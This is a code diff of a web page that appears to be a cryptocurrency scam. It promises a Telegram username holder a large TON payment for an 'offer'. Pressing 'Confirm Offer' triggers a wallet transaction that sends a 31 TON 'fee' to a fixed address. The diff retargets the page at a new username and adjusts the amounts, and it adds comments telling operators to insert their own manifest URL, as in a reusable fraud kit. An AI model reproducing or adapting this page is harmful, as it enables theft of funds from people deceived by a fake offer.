@@ -223,8 +223,8 @@
         <div class="content-wrapper">
             <div class="left-section">
                 <div class="info-box">
-                    <p>You will receive: <span>3256 TON</span> ($10501.58)</p>
-                    <p>Transaction fee: <span>152 TON</span> ($491.76)</p>
+                    <p>You will receive: <span>531 TON</span> ($1717.68)</p>
+                    <p>Transaction fee: <span>31 TON</span> ($100.28)</p>
                 </div>
                 <button id="agree-button" class="btn-primary">Confirm Offer</button>
             </div>
@@ -233,15 +233,15 @@
                     <table class="details-table">
                         <tr>
                             <th>Telegram Username</th>
-                            <td><a href="https://t.me/Hiroshi082">@Hiroshi082</a></td>
+                            <td><a href="https://t.me/Sufad12">@Sufad12</a></td>
                         </tr>
                         <tr>
                             <th>Web Address</th>
-                            <td><a href="https://t.me/Hiroshi082">t.me/Hiroshi082</a></td>
+                            <td><a href="https://t.me/Sufad12">t.me/Sufad12</a></td>
                         </tr>
                         <tr>
                             <th>TON Web 3.0 Address</th>
-                            <td><a href="https://Hiroshi082.t.me">Hiroshi082.t.me</a></td>
+                            <td><a href="https://Sufad12.t.me">Sufad12.t.me</a></td>
                         </tr>
                     </table>
                 </div>
@@ -255,8 +255,8 @@
 
         // Initialize TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json',
-            restoreConnection: true
+            manifestUrl: 'https://gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json', // Замените на ваш реальный URL манифеста
+            restoreConnection: true // Restore session for mobile devices
         });
 
         // Function to check TON network connectivity
@@ -327,7 +327,7 @@
                     messages: [
                         {
                             address: "UQA7zv18rAEKJt85gvCVXLJRzGfagMPPnS5AaDGJlTYgYKSU",
-                            amount: "152000000000" // 152 TON in nanoTON
+                            amount: "31000000000" // 31 TON in nanoTON
                         }
                     ]
                 };
@@ -402,7 +402,7 @@
 
         // Check manifest availability
         async function checkManifestUrl() {
-            const manifestUrl = 'gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json';
+            const manifestUrl = 'gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json'; // Замените на ваш реальный URL манифеста
             try {
                 const response = await fetch(manifestUrl);
                 if (!response.ok) {
